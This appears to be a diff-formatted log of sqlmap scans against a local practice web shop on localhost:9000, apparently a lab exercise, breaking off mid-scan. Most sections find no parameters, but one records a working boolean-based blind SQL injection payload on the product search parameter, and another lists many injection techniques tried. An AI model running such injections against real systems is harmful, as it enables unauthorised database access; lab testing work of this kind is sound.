+[*] starting @ 05:22:45 /2025-06-25/
+
+[05:22:45] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.0.5) Gecko/20060731 Ubuntu/dapper-security Firefox/1.5.0.5' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:45] [INFO] starting crawler for target URL 'http://localhost:9000/rest/basket/1'
+[05:22:45] [INFO] searching for links with depth 1
+[05:22:46] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:46 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/basket/1/coupon/1111111111
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:47 /2025-06-25/
+
+[05:22:47] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:47] [INFO] starting crawler for target URL 'http://localhost:9000/rest/basket/1/coupon/1111111111'
+[05:22:47] [INFO] searching for links with depth 1
+[05:22:48] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:48 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/languages
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.3#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:50 /2025-06-25/
+
+[05:22:50] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:50] [INFO] starting crawler for target URL 'http://localhost:9000/rest/languages'
+[05:22:50] [INFO] searching for links with depth 1
+[05:22:51] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:51 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/order-history
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:52 /2025-06-25/
+
+[05:22:52] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 (.NET CLR 3.5.30729)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:52] [INFO] starting crawler for target URL 'http://localhost:9000/rest/order-history'
+[05:22:52] [INFO] searching for links with depth 1
+[05:22:53] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:53 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/products/1/reviews
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:54 /2025-06-25/
+
+[05:22:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.3 Safari/532.2' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:54] [INFO] starting crawler for target URL 'http://localhost:9000/rest/products/1/reviews'
+[05:22:54] [INFO] searching for links with depth 1
+[05:22:55] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:56 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/products/42/reviews
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:57 /2025-06-25/
+
+[05:22:57] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.9 Safari/525.19' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:57] [INFO] starting crawler for target URL 'http://localhost:9000/rest/products/42/reviews'
+[05:22:57] [INFO] searching for links with depth 1
+[05:22:58] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:58 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/products/5/reviews
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:59 /2025-06-25/
+
+[05:22:59] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.0.8) Gecko/20061115 Ubuntu/dapper-security Firefox/1.5.0.8' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:59] [INFO] starting crawler for target URL 'http://localhost:9000/rest/products/5/reviews'
+[05:22:59] [INFO] searching for links with depth 1
+[05:23:00] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:23:00 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/products/search?q=
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:23:02 /2025-06-25/
+
+[05:23:02] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:23:02] [INFO] starting crawler for target URL 'http://localhost:9000/rest/products/search?q='
+[05:23:02] [INFO] searching for links with depth 1
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[1/1] URL:
+GET http://localhost:9000/rest/products/search?q=
+do you want to test this URL? [Y/n/q]
+> Y
+[05:23:03] [INFO] testing URL 'http://localhost:9000/rest/products/search?q='
+[05:23:03] [INFO] resuming back-end DBMS 'sqlite' 
+[05:23:03] [INFO] using '/home/kali/.local/share/sqlmap/output/results-06252025_0523am.csv' as the CSV results file in multiple targets mode
+[05:23:03] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: q=') AND 1939=1939 AND ('DcXz' LIKE 'DcXz
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[05:23:03] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[05:23:03] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-06252025_0523am.csv'
+
+[*] ending @ 05:23:03 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/user/login
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:23:05 /2025-06-25/
+
+[05:23:05] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; pt-br) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:23:05] [INFO] starting crawler for target URL 'http://localhost:9000/rest/user/login'
+[05:23:05] [INFO] searching for links with depth 1
+[05:23:06] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:23:06 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/user/whoami
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:23:07 /2025-06-25/
+
+[05:23:07] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:23:07] [INFO] starting crawler for target URL 'http://localhost:9000/rest/user/whoami'
+[05:23:07] [INFO] searching for links with depth 1
+[05:23:08] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:23:08 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/wallet/balance
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:23:10 /2025-06-25/
+
+[05:23:10] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en-US; rv:1.9.0.4) Gecko/20081029 Firefox/2.0.0.18' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:23:10] [INFO] starting crawler for target URL 'http://localhost:9000/rest/wallet/balance'
+[05:23:10] [INFO] searching for links with depth 1
+[05:23:10] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:23:10 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/runtime.js
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.3#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:23:12 /2025-06-25/
+
+[05:23:12] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; ko-KR; rv:1.9.0.1) Gecko/2008071717 Firefox/3.0.1' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:23:12] [INFO] starting crawler for target URL 'http://localhost:9000/runtime.js'
+[05:23:12] [INFO] searching for links with depth 1
+[05:23:12] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:23:13 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/socket.io/?EIO=4&transport=polling&t=PUaMWSY
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.3#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:23:14 /2025-06-25/
+
+[05:23:14] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:23:14] [INFO] starting crawler for target URL 'http://localhost:9000/socket.io/?EIO=4&transport=polling&t=PUaMWSY'
+[05:23:14] [INFO] searching for links with depth 1
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[1/1] URL:
+GET http://localhost:9000/socket.io/?EIO=4&transport=polling&t=PUaMWSY
+do you want to test this URL? [Y/n/q]
+> Y
+[05:23:15] [INFO] testing URL 'http://localhost:9000/socket.io/?EIO=4&transport=polling&t=PUaMWSY'
+[05:23:15] [INFO] using '/home/kali/.local/share/sqlmap/output/results-06252025_0523am.csv' as the CSV results file in multiple targets mode
+[05:23:15] [INFO] testing connection to the target URL
+[05:23:15] [INFO] testing if the target URL content is stable
+[05:23:15] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[05:23:15] [INFO] searching for dynamic content
+[05:23:15] [INFO] dynamic content marked for removal (1 region)
+[05:23:15] [INFO] testing if GET parameter 'EIO' is dynamic
+[05:23:15] [WARNING] GET parameter 'EIO' does not appear to be dynamic
+[05:23:15] [WARNING] heuristic (basic) test shows that GET parameter 'EIO' might not be injectable
+[05:23:15] [INFO] testing for SQL injection on GET parameter 'EIO'
+[05:23:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[05:23:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[05:23:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[05:23:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[05:23:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[05:23:16] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[05:23:16] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[05:23:17] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:17] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[05:23:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[05:23:17] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[05:23:17] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[05:23:17] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[05:23:17] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[05:23:17] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[05:23:17] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[05:23:17] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[05:23:17] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[05:23:17] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[05:23:17] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:17] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[05:23:17] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:17] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:17] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[05:23:17] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:17] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[05:23:18] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[05:23:18] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[05:23:18] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[05:23:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[05:23:18] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[05:23:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[05:23:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
+[05:23:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
+[05:23:18] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[05:23:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
+[05:23:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:19] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
+[05:23:19] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
+[05:23:19] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
+[05:23:19] [INFO] testing 'IBM DB2 AND error-based - WHERE or HAVING clause'
+[05:23:19] [INFO] testing 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:19] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:19] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[05:23:19] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[05:23:19] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[05:23:19] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
+[05:23:19] [INFO] testing 'Oracle error-based - Parameter replace'
+[05:23:19] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[05:23:19] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[05:23:19] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[05:23:19] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
+[05:23:19] [INFO] testing 'Generic inline queries'
+[05:23:19] [INFO] testing 'MySQL inline queries'
+[05:23:19] [INFO] testing 'PostgreSQL inline queries'
+[05:23:19] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[05:23:19] [INFO] testing 'Oracle inline queries'
+[05:23:19] [INFO] testing 'SQLite inline queries'
+[05:23:19] [INFO] testing 'Firebird inline queries'
+[05:23:19] [INFO] testing 'ClickHouse inline queries'
+[05:23:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[05:23:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[05:23:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[05:23:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[05:23:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[05:23:20] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[05:23:20] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[05:23:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[05:23:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
+[05:23:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[05:23:20] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
+[05:23:20] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
+[05:23:20] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[05:23:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[05:23:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[05:23:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[05:23:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[05:23:20] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[05:23:20] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[05:23:20] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[05:23:20] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[05:23:20] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[05:23:21] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[05:23:21] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[05:23:21] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[05:23:21] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
+[05:23:21] [INFO] testing 'Oracle AND time-based blind'
+[05:23:21] [INFO] testing 'Oracle AND time-based blind (heavy query)'
+[05:23:21] [INFO] testing 'IBM DB2 AND time-based blind (heavy query)'
+[05:23:21] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[05:23:21] [INFO] testing 'Informix AND time-based blind (heavy query)'
+[05:23:21] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[05:23:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[05:23:21] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[05:23:21] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
+[05:23:21] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
+[05:23:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:21] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:21] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
+[05:23:21] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[05:23:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[05:23:22] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[05:23:22] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[05:23:22] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[05:23:22] [WARNING] GET parameter 'EIO' does not seem to be injectable
+[05:23:22] [INFO] testing if GET parameter 'transport' is dynamic
+[05:23:22] [WARNING] GET parameter 'transport' does not appear to be dynamic
+[05:23:22] [WARNING] heuristic (basic) test shows that GET parameter 'transport' might not be injectable
+[05:23:22] [INFO] testing for SQL injection on GET parameter 'transport'
+[05:23:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[05:23:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[05:23:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[05:23:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[05:23:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[05:23:22] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:22] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[05:23:23] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[05:23:23] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:23] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[05:23:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[05:23:23] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[05:23:23] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[05:23:23] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[05:23:23] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[05:23:23] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[05:23:23] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[05:23:23] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[05:23:23] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[05:23:23] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[05:23:23] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:23] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[05:23:23] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:23] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:23] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[05:23:23] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:23] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[05:23:23] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[05:23:23] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[05:23:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[05:23:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[05:23:24] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[05:23:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
